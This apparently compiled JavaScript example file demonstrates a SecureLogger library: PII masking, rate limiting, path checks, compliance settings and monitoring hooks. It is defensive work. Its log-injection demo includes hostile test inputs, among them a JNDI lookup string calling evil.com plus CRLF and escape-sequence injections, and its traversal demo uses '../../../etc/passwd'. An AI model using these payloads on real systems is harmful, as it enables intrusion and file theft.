"use strict";
/**
 * @fileoverview Example usage of the SecureLogger implementation
 * @module secure-logger-usage.example
 * @description Demonstrates security features and best practices
 */
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.exampleBasicSecureLogger = exampleBasicSecureLogger;
exports.exampleProductionConfig = exampleProductionConfig;
exports.exampleSensitiveDataHandling = exampleSensitiveDataHandling;
exports.exampleSecurityMonitoring = exampleSecurityMonitoring;
exports.exampleLogInjectionPrevention = exampleLogInjectionPrevention;
exports.examplePathTraversalPrevention = examplePathTraversalPrevention;
exports.exampleComplianceLogging = exampleComplianceLogging;
exports.examplePerformanceOptimization = examplePerformanceOptimization;
exports.exampleErrorHandling = exampleErrorHandling;
exports.exampleMonitoringIntegration = exampleMonitoringIntegration;
const SecureLogger_1 = require("../security/SecureLogger");
const ILogger_1 = require("../interfaces/ILogger");
const crypto = __importStar(require("crypto"));
// Example 1: Basic Secure Logger Setup
function exampleBasicSecureLogger() {
    console.log('\n=== Basic Secure Logger ===\n');
    const logger = (0, SecureLogger_1.createSecureLogger)({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE],
        format: 'json',
        context: 'SecureApp'
    });
    // Safe logging
    logger.info('Application started securely');
    // Automatic PII masking
    logger.info('User email: john.doe@example.com will be masked');
    // Password masking
    logger.warn('Login attempt with password: secretPass123');
    // Credit card masking
    logger.error('Payment failed for card: 4111-1111-1111-1111');
}
// Example 2: Production-Grade Configuration
function exampleProductionConfig() {
    console.log('\n=== Production Configuration ===\n');
    // Generate secure keys (in production, use KMS)
    const signatureKey = crypto.randomBytes(32).toString('hex');
    const encryptionKey = crypto.randomBytes(32).toString('hex');
    const securityConfig = {
        // Input validation
        sanitizeInput: true,
        maxMessageSize: 10 * 1024,
        maxMetadataSize: 5 * 1024,
        // PII protection
        detectSensitiveData: true,
        piiPatterns: [
            /\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/gi,
            /\b\d{3}-\d{2}-\d{4}\b/g,
            /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g,
        ],
        sensitiveFields: [
            'password', 'token', 'apiKey', 'creditCard',
            'ssn', 'email', 'phone', 'dob'
        ],
        // DoS protection
        enableRateLimit: true,
        maxLogsPerMinute: 1000,
        // File security
        filePermissions: '0600',
        allowedPaths: ['./logs', '/var/log/app'],
        // Security monitoring
        enableSecurityEvents: true,
        // Cryptographic controls
        enableSignatures: true,
        signatureKey: signatureKey,
        enableEncryption: false, // Enable for sensitive data
        encryptionKey: encryptionKey
    };
    const logger = new SecureLogger_1.SecureLogger({
        level: ILogger_1.LogLevel.WARN,
        destinations: [ILogger_1.LogDestination.CONSOLE],
        format: 'json',
        context: 'Production'
    }, securityConfig);
    // Register security event handler
    logger.onSecurityEvent((event) => {
        console.log('[SECURITY ALERT]', JSON.stringify(event, null, 2));
    });
    logger.warn('Production logger initialized with security controls');
}
// Example 3: Handling Sensitive Data
function exampleSensitiveDataHandling() {
    console.log('\n=== Sensitive Data Handling ===\n');
    const logger = (0, SecureLogger_1.createSecureLogger)({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE]
    });
    // Bad practice - will be automatically masked
    const userData = {
        userId: 'USR123',
        username: 'johndoe',
        email: 'john.doe@example.com', // Will be masked
        password: 'secretPassword123', // Will be masked
        creditCard: '4111111111111111', // Will be masked
        ssn: '123-45-6789', // Will be masked
        phone: '555-123-4567', // Will be masked
        balance: 1000.00, // Safe to log
        lastLogin: new Date() // Safe to log
    };
    logger.info('User data processed', userData);
    // Good practice - log only necessary non-sensitive data
    const safeUserData = {
        userId: userData.userId,
        username: userData.username,
        balance: userData.balance,
        lastLogin: userData.lastLogin
    };
    logger.info('User activity', safeUserData);
}
// Example 4: Security Event Monitoring
function exampleSecurityMonitoring() {
    console.log('\n=== Security Event Monitoring ===\n');
    const securityConfig = {
        enableRateLimit: true,
        maxLogsPerMinute: 5, // Low limit for demonstration
        enableSecurityEvents: true
    };
    const logger = new SecureLogger_1.SecureLogger({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE]
    }, securityConfig);
    const securityEvents = [];
    // Capture security events
    logger.onSecurityEvent((event) => {
        securityEvents.push(event);
        console.log(`[SECURITY] ${event.type}: ${event.severity}`);
    });
    // Trigger rate limiting
    console.log('\nAttempting to exceed rate limit...');
    for (let i = 0; i < 10; i++) {
        logger.info(`Message ${i}`);
    }
    console.log(`\nSecurity events captured: ${securityEvents.length}`);
}
// Example 5: Log Injection Prevention
function exampleLogInjectionPrevention() {
    console.log('\n=== Log Injection Prevention ===\n');
    const logger = (0, SecureLogger_1.createSecureLogger)();
    // Attempt log injection attacks
    const maliciousInputs = [
        'Normal message\n[ERROR] Fake error injection',
        'User input\r\n[CRITICAL] System compromised',
        'Data\x00\x08\x1B[31mRED_TEXT\x1B[0m',
        'Message with ${jndi:ldap://evil.com/a}',
    ];
    console.log('Attempting log injection attacks...');
    maliciousInputs.forEach((input, index) => {
        logger.info(`Test ${index}: ${input}`);
    });
    console.log('\nAll injection attempts were sanitized!');
}
// Example 6: Path Traversal Prevention
function examplePathTraversalPrevention() {
    console.log('\n=== Path Traversal Prevention ===\n');
    const securityConfig = {
        allowedPaths: ['./logs', '/tmp/logs']
    };
    // Safe path - will work
    try {
        const safeLogger = (0, SecureLogger_1.createSecureLogger)({
            destinations: [ILogger_1.LogDestination.FILE],
            filePath: './logs/app.log'
        }, securityConfig);
        console.log('✓ Safe path accepted: ./logs/app.log');
    }
    catch (error) {
        console.error('✗ Safe path rejected:', error.message);
    }
    // Malicious path - will be blocked
    try {
        const maliciousLogger = (0, SecureLogger_1.createSecureLogger)({
            destinations: [ILogger_1.LogDestination.FILE],
            filePath: '../../../etc/passwd'
        }, securityConfig);
        console.log('✗ Malicious path accepted (SECURITY BREACH!)');
    }
    catch (error) {
        console.log('✓ Malicious path blocked:', error.message);
    }
}
// Example 7: Compliance-Specific Logging
function exampleComplianceLogging() {
    console.log('\n=== Compliance-Specific Logging ===\n');
    // GDPR-compliant configuration
    const gdprConfig = {
        detectSensitiveData: true,
        sensitiveFields: [
            'email', 'name', 'address', 'phone',
            'dateOfBirth', 'nationality', 'healthData'
        ],
        enableEncryption: true,
        encryptionKey: crypto.randomBytes(32).toString('hex')
    };
    const gdprLogger = (0, SecureLogger_1.createSecureLogger)({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE],
        context: 'GDPR'
    }, gdprConfig);
    // Personal data will be masked
    gdprLogger.info('Processing user', {
        id: 'USER123',
        name: 'John Doe', // Masked
        email: 'john@example.com', // Masked
        country: 'Germany', // Safe
        consent: true // Safe
    });
    // PCI DSS-compliant configuration
    const pciConfig = {
        detectSensitiveData: true,
        piiPatterns: [
            /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b/g, // Cards
        ],
        sensitiveFields: ['cardNumber', 'cvv', 'expiryDate'],
        enableSignatures: true,
        signatureKey: crypto.randomBytes(32).toString('hex')
    };
    const pciLogger = (0, SecureLogger_1.createSecureLogger)({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE],
        context: 'PCI'
    }, pciConfig);
    // Card data will be masked
    pciLogger.info('Payment processed', {
        transactionId: 'TXN123',
        cardNumber: '4111111111111111', // Masked
        amount: 100.00, // Safe
        merchant: 'ACME Corp' // Safe
    });
}
// Example 8: Performance Optimization
function examplePerformanceOptimization() {
    console.log('\n=== Performance Optimization ===\n');
    // Optimized configuration for high-volume logging
    const performanceConfig = {
        // Basic security enabled
        sanitizeInput: true,
        detectSensitiveData: false, // Disable if not needed
        // Higher rate limits
        enableRateLimit: true,
        maxLogsPerMinute: 10000,
        // Larger size limits
        maxMessageSize: 50 * 1024,
        maxMetadataSize: 20 * 1024,
        // Disable expensive features
        enableSignatures: false,
        enableEncryption: false
    };
    const logger = (0, SecureLogger_1.createSecureLogger)({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE],
        bufferSize: 100 // Enable buffering
    }, performanceConfig);
    console.log('Logging 1000 messages with optimized configuration...');
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
        logger.info(`High volume message ${i}`, {
            index: i,
            timestamp: Date.now()
        });
    }
    logger.flush();
    const duration = Date.now() - start;
    console.log(`Completed in ${duration}ms (${(1000 / duration * 1000).toFixed(2)} msgs/sec)`);
}
// Example 9: Error Handling and Recovery
function exampleErrorHandling() {
    console.log('\n=== Error Handling and Recovery ===\n');
    const logger = (0, SecureLogger_1.createSecureLogger)({
        level: ILogger_1.LogLevel.ERROR,
        destinations: [ILogger_1.LogDestination.CONSOLE]
    });
    // Handle errors gracefully
    try {
        throw new Error('Database connection failed');
    }
    catch (error) {
        // Error details will be safely logged
        logger.error('Operation failed', {
            error: error,
            operation: 'database.connect',
            retryCount: 3,
            nextRetry: Date.now() + 5000
        });
    }
    // Handle non-Error objects
    try {
        throw 'String error';
    }
    catch (error) {
        logger.error('Caught non-Error throwable', { error });
    }
    // Handle circular references
    const circular = { name: 'test' };
    circular.self = circular;
    logger.error('Circular reference handled', circular);
}
// Example 10: Integration with Monitoring Systems
function exampleMonitoringIntegration() {
    console.log('\n=== Monitoring Integration ===\n');
    // Simulated monitoring system
    class MonitoringSystem {
        constructor() {
            this.metrics = new Map();
        }
        increment(metric) {
            this.metrics.set(metric, (this.metrics.get(metric) || 0) + 1);
        }
        getMetrics() {
            return Object.fromEntries(this.metrics);
        }
    }
    const monitoring = new MonitoringSystem();
    const securityConfig = {
        enableSecurityEvents: true,
        detectSensitiveData: true
    };
    const logger = new SecureLogger_1.SecureLogger({
        level: ILogger_1.LogLevel.INFO,
        destinations: [ILogger_1.LogDestination.CONSOLE]
    }, securityConfig);
    // Hook into security events
    logger.onSecurityEvent((event) => {
        monitoring.increment(`security.${event.type}`);
        monitoring.increment(`security.severity.${event.severity}`);
    });
    // Generate some events
    logger.info('Email: test@example.com'); // Triggers PII detection
    logger.info('Password: secret123'); // Triggers PII detection
    console.log('\nMonitoring Metrics:', monitoring.getMetrics());
}
// Main execution
if (require.main === module) {
    console.log('═══════════════════════════════════════════════════');
    console.log('     Secure Logger Usage Examples                  ');
    console.log('═══════════════════════════════════════════════════');
    exampleBasicSecureLogger();
    exampleProductionConfig();
    exampleSensitiveDataHandling();
    exampleSecurityMonitoring();
    exampleLogInjectionPrevention();
    examplePathTraversalPrevention();
    exampleComplianceLogging();
    examplePerformanceOptimization();
    exampleErrorHandling();
    exampleMonitoringIntegration();
    console.log('\n═══════════════════════════════════════════════════');
    console.log('     All Examples Completed Successfully           ');
    console.log('═══════════════════════════════════════════════════');
}
//# sourceMappingURL=secure-logger-usage.example.js.map